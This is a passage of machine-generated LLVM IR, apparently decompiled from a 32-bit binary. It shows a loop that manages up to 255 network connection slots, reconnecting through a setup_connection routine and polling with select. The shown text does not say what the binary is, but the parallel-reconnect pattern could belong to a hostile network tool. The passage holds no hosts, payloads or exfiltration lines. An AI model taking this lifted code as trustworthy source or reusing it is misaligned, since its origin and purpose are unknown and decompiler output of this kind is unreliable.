  %v1_804f4bd = trunc i32 %v1_804f4ba to i16
  %v2_804f4bd = call i16 @llvm.bswap.i16(i16 %v1_804f4bd)
  %v3_804f4bd = zext i16 %v2_804f4bd to i32
  %v6_804f4bd = or i32 %v3_804f4bd, %v2_804f4ba
  store i32 %v6_804f4bd, i32* %eax.global-to-local, align 4
  %v12_804f4c1 = icmp eq i32 %v6_804f4bd, %v3_804f4a2
  %v1_804f4c3 = icmp eq i1 %v12_804f4c1, false
  br i1 %v1_804f4c3, label %dec_label_pc_804f40a, label %dec_label_pc_804f4c9

dec_label_pc_804f4c9:                             ; preds = %dec_label_pc_804f4a2
  %v0_804f4c9 = load i32, i32* @ebx, align 4
  %v1_804f4c9 = add i32 %v0_804f4c9, -255
  %v6_804f4c9 = sub i32 254, %v0_804f4c9
  %v7_804f4c9 = and i32 %v6_804f4c9, %v0_804f4c9
  %v8_804f4c9 = icmp slt i32 %v7_804f4c9, 0
  %v9_804f4c9 = icmp eq i32 %v1_804f4c9, 0
  %v10_804f4c9 = icmp slt i32 %v1_804f4c9, 0
  %v3_804f4cf = icmp eq i1 %v10_804f4c9, %v8_804f4c9
  %v4_804f4cf = icmp eq i1 %v9_804f4c9, false
  %v5_804f4cf = and i1 %v4_804f4cf, %v3_804f4cf
  br i1 %v5_804f4cf, label %dec_label_pc_804f5b5, label %dec_label_pc_804f4d5

dec_label_pc_804f4d5:                             ; preds = %dec_label_pc_804f4c9
  %v0_804f4d8 = load i32, i32* @global_var_805a870.51, align 16
  store i32 %v0_804f4d8, i32* %edx.global-to-local, align 4
  %v2_804f4de = mul i32 %v0_804f4c9, 288
  %v2_804f4e1 = add i32 %v0_804f4d8, %v2_804f4de
  store i32 %v2_804f4e1, i32* @eax, align 4
  %v1_804f4e3 = add i32 %v2_804f4e1, 12
  %v2_804f4e3 = inttoptr i32 %v1_804f4e3 to i32*
  %v3_804f4e3 = load i32, i32* %v2_804f4e3, align 4
  store i32 %v3_804f4e3, i32* @ebp, align 4
  %v1_804f4e6 = icmp eq i32 %v3_804f4e3, 0
  br i1 %v1_804f4e6, label %dec_label_pc_804f514, label %dec_label_pc_804f4ea

dec_label_pc_804f4ea:                             ; preds = %dec_label_pc_804f4d5
  %v2_804f4ea = mul i32 %v0_804f4c9, 8
  %v3_804f4ea = add i32 %v0_804f4c9, 9
  %v4_804f4ea = add i32 %v3_804f4ea, %v2_804f4ea
  %v2_804f4ee = mul i32 %v4_804f4ea, 32
  store i32 %v2_804f4ee, i32* %eax.global-to-local, align 4
  %v2_804f4f1 = add i32 %v0_804f4d8, %v2_804f4ee
  store i32 %v2_804f4f1, i32* %ecx.global-to-local, align 4
  store i32 %v0_804f4c9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f4f6

dec_label_pc_804f4f6:                             ; preds = %dec_label_pc_804f503, %dec_label_pc_804f4ea
  %v0_804f503 = phi i32 [ %v1_804f505, %dec_label_pc_804f503 ], [ %v2_804f4f1, %dec_label_pc_804f4ea ]
  %v0_804f4f6 = phi i32 [ %v1_804f4f6, %dec_label_pc_804f503 ], [ %v0_804f4c9, %dec_label_pc_804f4ea ]
  %v1_804f4f6 = add i32 %v0_804f4f6, 1
  store i32 %v1_804f4f6, i32* %edx.global-to-local, align 4
  %v6_804f4f7 = icmp eq i32 %v0_804f4f6, 255
  br i1 %v6_804f4f7, label %dec_label_pc_804f5b5.loopexit, label %dec_label_pc_804f503

dec_label_pc_804f503:                             ; preds = %dec_label_pc_804f4f6
  store i32 %v0_804f503, i32* @eax, align 4
  %v1_804f505 = add i32 %v0_804f503, 288
  store i32 %v1_804f505, i32* %ecx.global-to-local, align 4
  %v1_804f50b = add i32 %v0_804f503, 12
  %v2_804f50b = inttoptr i32 %v1_804f50b to i32*
  %v3_804f50b = load i32, i32* %v2_804f50b, align 4
  store i32 %v3_804f50b, i32* %ebx.global-to-local, align 4
  %v1_804f50e = icmp eq i32 %v3_804f50b, 0
  %v1_804f510 = icmp eq i1 %v1_804f50e, false
  br i1 %v1_804f510, label %dec_label_pc_804f4f6, label %dec_label_pc_804f512

dec_label_pc_804f512:                             ; preds = %dec_label_pc_804f503
  store i32 %v1_804f4f6, i32* @ebx, align 4
  br label %dec_label_pc_804f514

dec_label_pc_804f514:                             ; preds = %dec_label_pc_804f4d5, %dec_label_pc_804f512
  %v1_804f51c = phi i32 [ %v2_804f4e1, %dec_label_pc_804f4d5 ], [ %v0_804f503, %dec_label_pc_804f512 ]
  %v1_804f514 = icmp eq i32 %v1_804f51c, 0
  br i1 %v1_804f514, label %dec_label_pc_804f5b5, label %dec_label_pc_804f51c

dec_label_pc_804f51c:                             ; preds = %dec_label_pc_804f514
  %v2_804f51c = add i32 %v1_804f51c, 16
  %v3_804f51c = inttoptr i32 %v2_804f51c to i32*
  store i32 %v3_804f4a2, i32* %v3_804f51c, align 4
  %v0_804f51f = load i32, i32* @edi, align 4
  %v1_804f51f = trunc i32 %v0_804f51f to i16
  %v2_804f51f = load i32, i32* @eax, align 4
  %v3_804f51f = add i32 %v2_804f51f, 20
  %v4_804f51f = inttoptr i32 %v3_804f51f to i16*
  store i16 %v1_804f51f, i16* %v4_804f51f, align 2
  %v0_804f523 = call i32 @setup_connection()
  store i32 %v0_804f523, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f40a

dec_label_pc_804f530:                             ; preds = %dec_label_pc_804f267
  %v1_804f530 = trunc i32 %v2_804f241 to i8
  %v11_804f530 = icmp eq i8 %v1_804f530, -88
  br i1 %v11_804f530, label %dec_label_pc_804f234, label %dec_label_pc_804f282.thread

dec_label_pc_804f282.thread:                      ; preds = %dec_label_pc_804f530
  br label %dec_label_pc_804f28b.thread

dec_label_pc_804f542:                             ; preds = %dec_label_pc_804f279
  %.pre134 = trunc i32 %v2_804f241 to i8
  %tmp306 = icmp ult i8 %.pre134, 64
  br i1 %tmp306, label %dec_label_pc_804f299, label %dec_label_pc_804f54b

dec_label_pc_804f54b:                             ; preds = %dec_label_pc_804f542
  %tmp307 = icmp ult i8 %.pre134, 127
  br i1 %tmp307, label %dec_label_pc_804f234, label %dec_label_pc_804f554.thread

dec_label_pc_804f554.thread:                      ; preds = %dec_label_pc_804f54b
  br label %dec_label_pc_804f294.thread

dec_label_pc_804f55d:                             ; preds = %dec_label_pc_804f28b
  %.pre133 = trunc i32 %v2_804f241 to i8
  %tmp308 = icmp ult i8 %.pre133, 18
  br i1 %tmp308, label %dec_label_pc_804f299, label %dec_label_pc_804f566

dec_label_pc_804f566:                             ; preds = %dec_label_pc_804f55d
  %tmp309 = or i8 %.pre133, 1
  %tmp310 = icmp eq i8 %tmp309, 19
  br i1 %tmp310, label %dec_label_pc_804f234, label %dec_label_pc_804f299

dec_label_pc_804f574:                             ; preds = %dec_label_pc_804f270
  %v1_804f574 = trunc i32 %v2_804f241 to i8
  %tmp311 = icmp ult i8 %v1_804f574, 16
  br i1 %tmp311, label %dec_label_pc_804f299, label %dec_label_pc_804f57d

dec_label_pc_804f57d:                             ; preds = %dec_label_pc_804f574
  %tmp312 = icmp ult i8 %v1_804f574, 32
  br i1 %tmp312, label %dec_label_pc_804f234, label %dec_label_pc_804f28b.thread

dec_label_pc_804f58f:                             ; preds = %dec_label_pc_804f282
  %.pre = trunc i32 %v2_804f241 to i8
  %v11_804f58f = icmp eq i8 %.pre, -1
  %v1_804f592 = icmp eq i1 %v11_804f58f, false
  br i1 %v1_804f592, label %dec_label_pc_804f294.thread, label %dec_label_pc_804f234

dec_label_pc_804f59d:                             ; preds = %dec_label_pc_804ee40
  store i32 0, i32* %stack_var_-1916, align 4
  %v1_804f5a2 = call i32 @__GI_exit(i32 0)
  store i32 %v1_804f5a2, i32* %eax.global-to-local, align 4
  %v0_804f36d.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f5a7

dec_label_pc_804f5a7:                             ; preds = %dec_label_pc_804f2f3, %dec_label_pc_804f59d
  %v0_804f36d.pre = phi i32 [ %v0_804f36d.pre.pre, %dec_label_pc_804f59d ], [ %v1_804f34b, %dec_label_pc_804f2f3 ]
  %stack_var_-1892.4 = phi i32 [ %tmp136, %dec_label_pc_804f59d ], [ %stack_var_-1892.1, %dec_label_pc_804f2f3 ]
  %stack_var_-1888.4 = phi i32 [ %tmp137, %dec_label_pc_804f59d ], [ %stack_var_-1888.1, %dec_label_pc_804f2f3 ]
  br label %dec_label_pc_804f368

dec_label_pc_804f5b5.loopexit:                    ; preds = %dec_label_pc_804f4f6
  br label %dec_label_pc_804f5b5

dec_label_pc_804f5b5:                             ; preds = %dec_label_pc_804f514, %dec_label_pc_804f4c9, %dec_label_pc_804f43f, %dec_label_pc_804f40a, %dec_label_pc_804f5b5.loopexit
  store i32 32, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_804f5be = add i32 %v0_804f434, 44
  %v2_804f5be = inttoptr i32 %v1_804f5be to i32*
  %v3_804f5be = load i32, i32* %v2_804f5be, align 4
  %v4_804f5be = inttoptr i32 %v3_804f5be to i8*
  %v5_804f5c3 = call i8* @_memset(i8* %v4_804f5be, i32 0, i32 32)
  %v0_804f5c5 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804f5c5, i32* %ecx.global-to-local, align 4
  %v0_804f5c7 = load i32, i32* @esp, align 4
  %v1_804f5c7 = add i32 %v0_804f5c7, 8
  %v2_804f5c7 = inttoptr i32 %v1_804f5c7 to i32*
  %v3_804f5c7 = load i32, i32* %v2_804f5c7, align 4
  %v4_804f5c7 = inttoptr i32 %v3_804f5c7 to i8*
  %v2_804f5cc = load i32, i32* %eax.global-to-local, align 4
  %v5_804f5cc = call i8* @_memset(i8* %v4_804f5c7, i32 %v2_804f5cc, i32 %v0_804f5c5)
  %v6_804f5cc = ptrtoint i8* %v5_804f5cc to i32
  store i32 %v6_804f5cc, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store i32 0, i32* @esi, align 4
  %v0_804f5d2 = load i32, i32* @esp, align 4
  %v1_804f5d2 = add i32 %v0_804f5d2, 1872
  %v2_804f5d2 = inttoptr i32 %v1_804f5d2 to i32*
  store i32 0, i32* %v2_804f5d2, align 4
  %v0_804f619.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f619

dec_label_pc_804f5e0:                             ; preds = %dec_label_pc_804f638
  %v1_804f5e0 = add i32 %v3_804f626, -1
  %v8_804f5e0 = icmp eq i32 %v1_804f5e0, 0
  store i32 %v1_804f5e0, i32* %ecx.global-to-local, align 4
  %v1_80503a0 = add i32 %v2_804f624, 4
  %v2_80503a0 = inttoptr i32 %v1_80503a0 to i32*
  %v3_80503a0 = load i32, i32* %v2_80503a0, align 4
  %v1_80503a5 = urem i32 %v3_80503a0, 32
  store i32 %v1_80503a5, i32* %eax.global-to-local, align 4
  %v2_80503a8 = udiv i32 %v3_80503a0, 32
  store i32 %v2_80503a8, i32* %edx.global-to-local, align 4
  %v0_80503ab = load i32, i32* @esp, align 4
  %v2_80503ab = mul nuw nsw i32 %v2_80503a8, 4
  br i1 %v8_804f5e0, label %dec_label_pc_80503a0, label %dec_label_pc_804f5e7

dec_label_pc_804f5e7:                             ; preds = %dec_label_pc_804f5e0
  %v3_804f5f2 = add nuw nsw i32 %v2_80503ab, 1700
  %v4_804f5f2 = add i32 %v3_804f5f2, %v0_80503ab
  %v5_804f5f2 = inttoptr i32 %v4_804f5f2 to i32*
  %v6_804f5f2 = load i32, i32* %v5_804f5f2, align 4
  %v9_804f5f2 = shl i32 1, %v1_80503a5
  %v12_804f5f2 = or i32 %v6_804f5f2, %v9_804f5f2
  store i32 %v12_804f5f2, i32* %v5_804f5f2, align 4
  %v0_804f5fa = load i32, i32* @ebx, align 4
  %v1_804f5fa = add i32 %v0_804f5fa, 4
  %v2_804f5fa = inttoptr i32 %v1_804f5fa to i32*
  %v3_804f5fa = load i32, i32* %v2_804f5fa, align 4
  store i32 %v3_804f5fa, i32* %eax.global-to-local, align 4
  %v1_804f5fd = load i32, i32* @edi, align 4
  %v2_804f5fd = sub i32 %v3_804f5fa, %v1_804f5fd
  %v8_804f5fd = xor i32 %v1_804f5fd, %v3_804f5fa
  %v9_804f5fd = xor i32 %v2_804f5fd, %v3_804f5fa
  %v10_804f5fd = and i32 %v9_804f5fd, %v8_804f5fd
  %v11_804f5fd = icmp slt i32 %v10_804f5fd, 0
  %v12_804f5fd = icmp eq i32 %v2_804f5fd, 0
  %v13_804f5fd = icmp slt i32 %v2_804f5fd, 0
  %v3_804f5ff = icmp ne i1 %v13_804f5fd, %v11_804f5fd
  %v4_804f5ff = or i1 %v12_804f5fd, %v3_804f5ff
  br i1 %v4_804f5ff, label %dec_label_pc_804f603, label %dec_label_pc_804f601

dec_label_pc_804f601:                             ; preds = %dec_label_pc_804f5e7
  store i32 %v3_804f5fa, i32* @edi, align 4
  br label %dec_label_pc_804f603

dec_label_pc_804f603:                             ; preds = %dec_label_pc_80503a0, %dec_label_pc_804f5e7, %dec_label_pc_804f619, %dec_label_pc_80503e0, %dec_label_pc_80503be, %dec_label_pc_804f67b, %dec_label_pc_804f601
  %stack_var_-1892.5 = phi i32 [ %stack_var_-1892.6, %dec_label_pc_804f619 ], [ %stack_var_-1892.6, %dec_label_pc_80503a0 ], [ %stack_var_-1892.6, %dec_label_pc_80503be ], [ %stack_var_-1892.6, %dec_label_pc_804f5e7 ], [ %stack_var_-1892.6, %dec_label_pc_804f601 ], [ %stack_var_-1892.7, %dec_label_pc_80503e0 ], [ %stack_var_-1892.6, %dec_label_pc_804f67b ]
  %stack_var_-1888.5 = phi i32 [ %stack_var_-1888.6, %dec_label_pc_804f619 ], [ %stack_var_-1888.6, %dec_label_pc_80503a0 ], [ %stack_var_-1888.6, %dec_label_pc_80503be ], [ %stack_var_-1888.6, %dec_label_pc_804f5e7 ], [ %stack_var_-1888.6, %dec_label_pc_804f601 ], [ %stack_var_-1888.7, %dec_label_pc_80503e0 ], [ %stack_var_-1888.6, %dec_label_pc_804f67b ]
  %v0_804f603 = load i32, i32* @esp, align 4
  %v1_804f603 = add i32 %v0_804f603, 1872
  %v2_804f603 = inttoptr i32 %v1_804f603 to i32*
  %v3_804f603 = load i32, i32* %v2_804f603, align 4
  %v1_804f60a = add i32 %v3_804f603, 1
  store i32 %v1_804f60a, i32* %eax.global-to-local, align 4
  store i32 %v1_804f60a, i32* %v2_804f603, align 4
  %v0_804f612 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f612 = add i32 %v0_804f612, -255
  %v6_804f612 = sub i32 254, %v0_804f612
  %v7_804f612 = and i32 %v6_804f612, %v0_804f612
  %v8_804f612 = icmp slt i32 %v7_804f612, 0
  %v9_804f612 = icmp eq i32 %v1_804f612, 0
  %v10_804f612 = icmp slt i32 %v1_804f612, 0
  %v3_804f617 = icmp eq i1 %v10_804f612, %v8_804f612
  %v4_804f617 = icmp eq i1 %v9_804f612, false
  %v5_804f617 = and i1 %v4_804f617, %v3_804f617
  br i1 %v5_804f617, label %dec_label_pc_804f687, label %dec_label_pc_804f619

dec_label_pc_804f619:                             ; preds = %dec_label_pc_804f603, %dec_label_pc_804f5b5
  %v0_804f619 = phi i32 [ %v0_804f619.pre, %dec_label_pc_804f5b5 ], [ %v0_804f612, %dec_label_pc_804f603 ]
  %stack_var_-1892.6 = phi i32 [ %stack_var_-1892.3, %dec_label_pc_804f5b5 ], [ %stack_var_-1892.5, %dec_label_pc_804f603 ]
  %stack_var_-1888.6 = phi i32 [ %stack_var_-1888.3, %dec_label_pc_804f5b5 ], [ %stack_var_-1888.5, %dec_label_pc_804f603 ]
  %v0_804f61c = load i32, i32* @global_var_805a870.51, align 16
  store i32 %v0_804f61c, i32* %eax.global-to-local, align 4
  %v2_804f621 = mul i32 %v0_804f619, 288
  %v2_804f624 = add i32 %v0_804f61c, %v2_804f621
  store i32 %v2_804f624, i32* @ebx, align 4
  %v1_804f626 = add i32 %v2_804f624, 12
  %v2_804f626 = inttoptr i32 %v1_804f626 to i32*
  %v3_804f626 = load i32, i32* %v2_804f626, align 4
  store i32 %v3_804f626, i32* %ecx.global-to-local, align 4
  %v5_804f629 = icmp ult i32 %v3_804f626, 2
  %v1_804f631 = select i1 %v5_804f629, i32 31, i32 30
  store i32 %v1_804f631, i32* %edx.global-to-local, align 4
  %v1_804f634 = icmp eq i32 %v3_804f626, 0
  br i1 %v1_804f634, label %dec_label_pc_804f603, label %dec_label_pc_804f638

dec_label_pc_804f638:                             ; preds = %dec_label_pc_804f619
  %v0_804f638 = load i32, i32* @global_var_8057d90.47, align 16
  store i32 %v0_804f638, i32* %eax.global-to-local, align 4
  %v1_804f63d = add i32 %v2_804f624, 8
  %v2_804f63d = inttoptr i32 %v1_804f63d to i32*
  %v3_804f63d = load i32, i32* %v2_804f63d, align 4
  store i32 %v3_804f63d, i32* @ebp, align 4
  %v2_804f640 = sub i32 %v0_804f638, %v3_804f63d
  store i32 %v2_804f640, i32* @eax, align 4
  %tmp313 = icmp ugt i32 %v2_804f640, %v1_804f631
  br i1 %tmp313, label %dec_label_pc_804f646, label %dec_label_pc_804f5e0

dec_label_pc_804f646:                             ; preds = %dec_label_pc_804f638
  %v0_804f646 = load i32, i32* @esp, align 4
  %v1_804f649 = add i32 %v2_804f624, 4
  %v2_804f649 = inttoptr i32 %v1_804f649 to i32*
  %v3_804f649 = load i32, i32* %v2_804f649, align 4
  store i32 %v3_804f649, i32* %ecx.global-to-local, align 4
  %v2_804f64c = add i32 %v0_804f646, -16
  %v3_804f64c = inttoptr i32 %v2_804f64c to i32*
  store i32 %v3_804f649, i32* %v3_804f64c, align 4
  %v0_804f64d = load i32, i32* %stack_var_-1916, align 4
  %v1_804f64d = call i32 @__GI___libc_close(i32 %v0_804f64d)
  store i32 %v1_804f64d, i32* %eax.global-to-local, align 4
  %v0_804f655 = load i32, i32* @ebx, align 4
  %v1_804f655 = add i32 %v0_804f655, 4
  %v2_804f655 = inttoptr i32 %v1_804f655 to i32*
  store i32 -1, i32* %v2_804f655, align 4
  %v0_804f65c = load i32, i32* @ebx, align 4
  %v1_804f65c = add i32 %v0_804f65c, 12
  %v2_804f65c = inttoptr i32 %v1_804f65c to i32*
  %v3_804f65c = load i32, i32* %v2_804f65c, align 4
  %tmp314 = icmp ult i32 %v3_804f65c, 3
  br i1 %tmp314, label %dec_label_pc_80503e0, label %dec_label_pc_804f666

dec_label_pc_804f666:                             ; preds = %dec_label_pc_804f646
  %v1_804f666 = add i32 %v0_804f65c, 284
  %v2_804f666 = inttoptr i32 %v1_804f666 to i8*
  %v3_804f666 = load i8, i8* %v2_804f666, align 1
  %v4_804f666 = zext i8 %v3_804f666 to i32
  %v6_804f666 = and i32 %v1_804f64d, -256
  %v7_804f666 = or i32 %v4_804f666, %v6_804f666
  %v1_804f66c = add i32 %v7_804f666, 1
  %v10_804f66c = trunc i32 %v1_804f66c to i8
  store i32 %v1_804f66c, i32* %eax.global-to-local, align 4
  store i8 %v10_804f66c, i8* %v2_804f666, align 1
  %v0_804f673 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f673 = trunc i32 %v0_804f673 to i8
  %v10_804f673 = icmp eq i8 %v1_804f673, 10
  br i1 %v10_804f673, label %dec_label_pc_80503e0, label %dec_label_pc_804f67b

dec_label_pc_804f67b:                             ; preds = %dec_label_pc_804f666
  %v0_804f67b = load i32, i32* @ebx, align 4
  store i32 %v0_804f67b, i32* @eax, align 4
  %v0_804f67d = call i32 @setup_connection()
  store i32 %v0_804f67d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f603

dec_label_pc_804f687:                             ; preds = %dec_label_pc_804f603
  %v0_804f687 = load i32, i32* @esp, align 4
  %v1_804f687 = add i32 %v0_804f687, 1860
  %v2_804f687 = inttoptr i32 %v1_804f687 to i32*
  store i32 0, i32* %v2_804f687, align 4
  %v0_804f692 = load i32, i32* @esp, align 4
  %v1_804f692 = add i32 %v0_804f692, 1856
  %v2_804f692 = inttoptr i32 %v1_804f692 to i32*
  store i32 1, i32* %v2_804f692, align 4
  %v0_804f69d = load i32, i32* @esp, align 4
  %v0_804f6a0 = load i32, i32* @esi, align 4
  %v1_804f6a0 = load i32, i32* @edi, align 4
  %v2_804f6a0 = sub i32 %v0_804f6a0, %v1_804f6a0
  %v8_804f6a0 = xor i32 %v1_804f6a0, %v0_804f6a0
  %v9_804f6a0 = xor i32 %v2_804f6a0, %v0_804f6a0
  %v10_804f6a0 = and i32 %v9_804f6a0, %v8_804f6a0
  %v11_804f6a0 = icmp slt i32 %v10_804f6a0, 0
  %v13_804f6a0 = icmp slt i32 %v2_804f6a0, 0
  %v1_804f6a2 = add i32 %v0_804f69d, 1856
  %v2_804f6a9 = add i32 %v0_804f69d, -16
  %v3_804f6a9 = inttoptr i32 %v2_804f6a9 to i32*
  store i32 %v1_804f6a2, i32* %v3_804f6a9, align 4
  %v1_804f6aa = add i32 %v0_804f69d, -20
  %v2_804f6aa = inttoptr i32 %v1_804f6aa to i32*
  store i32 0, i32* %v2_804f6aa, align 4
  %v1_804f6ac = add i32 %v0_804f69d, 1572
  store i32 %v1_804f6ac, i32* %edx.global-to-local, align 4
  %v0_804f6b3 = load i32, i32* @esi, align 4
  store i32 %v0_804f6b3, i32* %eax.global-to-local, align 4
  %v2_804f6b5 = add i32 %v0_804f69d, -24
  %v3_804f6b5 = inttoptr i32 %v2_804f6b5 to i32*
  store i32 %v1_804f6ac, i32* %v3_804f6b5, align 4
  %v1_804f6b6 = add i32 %v0_804f69d, 1700
  store i32 %v1_804f6b6, i32* %ecx.global-to-local, align 4
  %v2_804f6bd = add i32 %v0_804f69d, -28
  %v3_804f6bd = inttoptr i32 %v2_804f6bd to i32*
  store i32 %v1_804f6b6, i32* %v3_804f6bd, align 4
  %v2_804f6be = icmp eq i1 %v13_804f6a0, %v11_804f6a0
  br i1 %v2_804f6be, label %dec_label_pc_804f687.dec_label_pc_804f6c2_crit_edge, label %dec_label_pc_804f6c0

dec_label_pc_804f687.dec_label_pc_804f6c2_crit_edge: ; preds = %dec_label_pc_804f687
  %v0_804f6c2.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f6c2

dec_label_pc_804f6c0:                             ; preds = %dec_label_pc_804f687
  %v0_804f6c0 = load i32, i32* @edi, align 4
  store i32 %v0_804f6c0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f6c2

dec_label_pc_804f6c2:                             ; preds = %dec_label_pc_804f687.dec_label_pc_804f6c2_crit_edge, %dec_label_pc_804f6c0
  %v0_804f6c2 = phi i32 [ %v0_804f6c2.pre, %dec_label_pc_804f687.dec_label_pc_804f6c2_crit_edge ], [ %v0_804f6c0, %dec_label_pc_804f6c0 ]
  %v1_804f6c2 = add i32 %v0_804f6c2, 1
  store i32 %v1_804f6c2, i32* %eax.global-to-local, align 4
  %v2_804f6c3 = add i32 %v0_804f69d, -32
  %v3_804f6c3 = inttoptr i32 %v2_804f6c3 to i32*
  store i32 %v1_804f6c2, i32* %v3_804f6c3, align 4
  %v0_804f6c4 = call i32 @__libc_select()
  store i32 %v0_804f6c4, i32* %eax.global-to-local, align 4
  %v0_804f6c9 = load i32, i32* @esp, align 4
  %v1_804f6cc = add i32 %v0_804f6c9, 16
  %v2_804f6cc = inttoptr i32 %v1_804f6cc to i32*
  store i32 0, i32* %v2_804f6cc, align 4
  %v0_804f6ce = load i32, i32* %stack_var_-1916, align 4
  %v1_804f6ce = inttoptr i32 %v0_804f6ce to i32*
  %v2_804f6ce = call i32 @__GI_time(i32* %v1_804f6ce)
  %v0_804f6d3 = load i32, i32* @esp, align 4
  %v1_804f6d3 = add i32 %v0_804f6d3, 1888
  %v2_804f6d3 = inttoptr i32 %v1_804f6d3 to i32*
  store i32 0, i32* %v2_804f6d3, align 4
  store i32 %v2_804f6ce, i32* @global_var_8057d90.47, align 16
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8050185 = inttoptr i32 %v0_804eda2 to i32*
  %v1_80502f2 = trunc i32 %v0_804eda0 to i8
  br label %dec_label_pc_804f6e8

dec_label_pc_804f6e8:                             ; preds = %dec_label_pc_804fcc6, %dec_label_pc_804f6c2
  %v0_804f6e8 = phi i32 [ %v0_804fcd5, %dec_label_pc_804fcc6 ], [ 0, %dec_label_pc_804f6c2 ]
  %v0_804f6eb = load i32, i32* @global_var_805a870.51, align 16
  store i32 %v0_804f6eb, i32* %edx.global-to-local, align 4
  %v2_804f6f1 = mul i32 %v0_804f6e8, 288
  %v2_804f6f4 = add i32 %v0_804f6eb, %v2_804f6f1
  store i32 %v2_804f6f4, i32* @esi, align 4
  %v1_804f6f6 = add i32 %v2_804f6f4, 4
  %v2_804f6f6 = inttoptr i32 %v1_804f6f6 to i32*
  %v3_804f6f6 = load i32, i32* %v2_804f6f6, align 4
  store i32 %v3_804f6f6, i32* %eax.global-to-local, align 4
  %v10_804f6f9 = icmp eq i32 %v3_804f6f6, -1
  br i1 %v10_804f6f9, label %dec_label_pc_804fcc6, label %dec_label_pc_804f702

dec_label_pc_804f702:                             ; preds = %dec_label_pc_804f6e8
  %v2_804f706 = udiv i32 %v3_804f6f6, 32
  store i32 %v2_804f706, i32* %edx.global-to-local, align 4
  %v1_804f709 = urem i32 %v3_804f6f6, 32
  store i32 %v1_804f709, i32* %ecx.global-to-local, align 4
  %v0_804f70c = load i32, i32* @esp, align 4
  %v2_804f70c = mul nuw nsw i32 %v2_804f706, 4
  %v3_804f70c = add nuw nsw i32 %v2_804f70c, 1572
  %v4_804f70c = add i32 %v3_804f70c, %v0_804f70c
  %v5_804f70c = inttoptr i32 %v4_804f70c to i32*
  %v6_804f70c = load i32, i32* %v5_804f70c, align 4
  %v9_804f70c = shl i32 1, %v1_804f709
  %v10_804f70c = and i32 %v6_804f70c, %v9_804f70c
  %v11_804f70c = icmp ne i32 %v10_804f70c, 0
  %v1_804f714 = zext i1 %v11_804f70c to i32
  %v3_804f714 = and i32 %v3_804f6f6, -256
  %v4_804f714 = or i32 %v1_804f714, %v3_804f714
  store i32 %v4_804f714, i32* %eax.global-to-local, align 4
  %v4_804f717 = icmp eq i1 %v11_804f70c, false
  %v1_804f719 = icmp eq i1 %v4_804f717, false
  br i1 %v1_804f719, label %dec_label_pc_80500b1, label %dec_label_pc_804f71f

dec_label_pc_804f71f:                             ; preds = %dec_label_pc_804f702, %dec_label_pc_8050148
  %v2_804f727 = phi i32 [ %v4_804f714, %dec_label_pc_804f702 ], [ %v2_804f727.pre, %dec_label_pc_8050148 ]
  %v7_804f71f = phi i32 [ %v1_804f709, %dec_label_pc_804f702 ], [ %v7_804f71f.pre, %dec_label_pc_8050148 ]
  %v1_804f71f = phi i32 [ %v2_804f706, %dec_label_pc_804f702 ], [ %v2_805015b, %dec_label_pc_8050148 ]
  %v1_804f738 = phi i32 [ %v0_804f70c, %dec_label_pc_804f702 ], [ %v0_804f71f.pre, %dec_label_pc_8050148 ]
  %v2_804f71f = mul nuw nsw i32 %v1_804f71f, 4
  %v3_804f71f = add i32 %v1_804f738, 1700
  %v4_804f71f = add i32 %v3_804f71f, %v2_804f71f
  %v5_804f71f = inttoptr i32 %v4_804f71f to i32*
  %v6_804f71f = load i32, i32* %v5_804f71f, align 4
  %v8_804f71f = urem i32 %v7_804f71f, 32
  %v9_804f71f = shl i32 1, %v8_804f71f
  %v10_804f71f = and i32 %v6_804f71f, %v9_804f71f
  %v11_804f71f = icmp ne i32 %v10_804f71f, 0
  %v1_804f727 = zext i1 %v11_804f71f to i32
  %v3_804f727 = and i32 %v2_804f727, -256
  %v4_804f727 = or i32 %v1_804f727, %v3_804f727
  store i32 %v4_804f727, i32* %eax.global-to-local, align 4
  %v4_804f72a = icmp eq i1 %v11_804f71f, false
  br i1 %v4_804f72a, label %dec_label_pc_804fcc6, label %dec_label_pc_804f732

dec_label_pc_804f732:                             ; preds = %dec_label_pc_804f71f
  %v0_804f732 = load i32, i32* @esi, align 4
  %v1_804f732 = add i32 %v0_804f732, 28
  store i32 %v1_804f732, i32* %eax.global-to-local, align 4
  %v1_804f735 = add i32 %v0_804f732, 92
  store i32 %v1_804f735, i32* %edx.global-to-local, align 4
  %v2_804f738 = add i32 %v1_804f738, 20
  %v3_804f738 = inttoptr i32 %v2_804f738 to i32*
  store i32 %v1_804f732, i32* %v3_804f738, align 4
  %v0_804f73c = load i32, i32* %edx.global-to-local, align 4
  %v1_804f73c = load i32, i32* @esp, align 4
  %v2_804f73c = add i32 %v1_804f73c, 16
  %v3_804f73c = inttoptr i32 %v2_804f73c to i32*
  store i32 %v0_804f73c, i32* %v3_804f73c, align 4
  %v0_804f74031 = load i32, i32* @esi, align 4
  %v1_804f74032 = add i32 %v0_804f74031, 12
  %v2_804f74033 = inttoptr i32 %v1_804f74032 to i32*
  %v3_804f74034 = load i32, i32* %v2_804f74033, align 4
  store i32 %v3_804f74034, i32* %eax.global-to-local, align 4
  %v1_804f74335 = icmp eq i32 %v3_804f74034, 0
  br i1 %v1_804f74335, label %dec_label_pc_804fcc6, label %dec_label_pc_804f74b.preheader

dec_label_pc_804f74b.preheader:                   ; preds = %dec_label_pc_804f732, %dec_label_pc_804f740.backedge
  br label %dec_label_pc_804f74b

dec_label_pc_804f74b:                             ; preds = %dec_label_pc_804f74b.preheader, %dec_label_pc_804fcbb
  %v0_804f74b = load i32, i32* @esp, align 4
  %v1_804f74b = add i32 %v0_804f74b, 20
  %v2_804f74b = inttoptr i32 %v1_804f74b to i32*
  %v3_804f74b = load i32, i32* %v2_804f74b, align 4
  store i32 %v3_804f74b, i32* %ecx.global-to-local, align 4
  %v2_804f74f = add i32 %v0_804f74b, 24
